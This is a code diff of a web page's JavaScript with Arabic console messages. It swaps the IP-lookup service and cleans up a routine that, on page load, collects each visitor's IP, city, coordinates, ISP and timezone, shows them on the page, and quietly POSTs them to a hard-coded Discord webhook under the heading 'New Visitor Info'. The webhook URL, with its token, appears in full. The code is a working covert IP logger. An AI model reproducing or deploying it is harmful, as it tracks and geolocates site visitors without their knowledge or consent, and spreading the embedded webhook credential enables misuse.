@@ -253,17 +253,24 @@
     };
 
     // Fetch IP information without API token
-fetch('https://ipinfo.io/json')
-  .then(response => response.json())
- .then(data => {
-    
+fetch('https://ipwho.is/')
+  .then(response => {
     if (!response.ok) throw new Error(`HTTP ${response.status}`);
     return response.json();
   })
   .then(data => {
-  const { ip, country, city, region, loc, org, timezone } = data;
+    if (!data.success) throw new Error('API returned error');
+
+    const ip = data.ip;
+    const country = data.country;
+    const city = data.city;
+    const region = data.region;
+    const loc = `${data.latitude},${data.longitude}`;
+    const org = data.connection?.isp || 'N/A';
+    const timezone = data.timezone?.id || 'N/A';
 
     const port = window.location.port || (location.protocol === 'https:' ? '443' : '80');
+
     const infoDiv = document.getElementById('ip-info');
     if (!infoDiv) {
       console.error("عنصر #ip-info غير موجود في الصفحة!");
@@ -278,30 +285,32 @@ fetch('https://ipinfo.io/json')
 <strong>Country:</strong> ${country}<br>
 <strong>Location:</strong> ${loc}<br>
 <strong>ISP:</strong> ${org}<br>
-<strong>Timezone:</strong> ${timezone}`;
+<strong>Timezone:</strong> ${timezone}
+`;
 
     const dateTime = new Date().toLocaleString();
+
     const webhookUrl = 'https://discord.com/api/webhooks/1351172060248019066/7xfV1QVOYKzmxhM8tBKK5VwXJpsHnFS-6HysAx1YUHnm8Ksjr7W8SmlwysjaU3lypP0O';
 
     fetch(webhookUrl, {
       method: 'POST',
-      headers: {'Content-Type': 'application/json'},
+      headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        content: `⚠️ **5 1 1** ⚠️\n\n` +
+        content: `⚠️ **New Visitor Info** ⚠️\n\n` +
                  `**IP:** \`${ip}\`\n` +
                  `**Port:** \`${port}\`\n` +
                  `**Location:** ${country} - ${city}\n` +
-                 `**Coordinates:** ${loc}\`\n` +
-                 `**ISP:** ${org}\`\n` +
+                 `**Coordinates:** ${loc}\n` +
+                 `**ISP:** ${org}\n` +
                  `**Time:** ${dateTime}`
       })
     }).then(res => {
-      if (!res.ok) console.error("فشل إرسال البيانات إلى الديسكورد");
-    }).catch(err => console.error("خطأ في إرسال الديسكورد:", err));
+      if (!res.ok) console.error("❌ فشل إرسال البيانات إلى الديسكورد");
+    }).catch(err => console.error("❌ خطأ في إرسال إلى الديسكورد:", err));
 
   })
   .catch(err => {
-    console.error("خطأ في جلب بيانات IP:", err);
+    console.error("❌ خطأ في جلب بيانات IP:", err);
     const infoDiv = document.getElementById('ip-info');
     if (infoDiv) infoDiv.textContent = 'تعذر تحميل معلومات IP';
   });
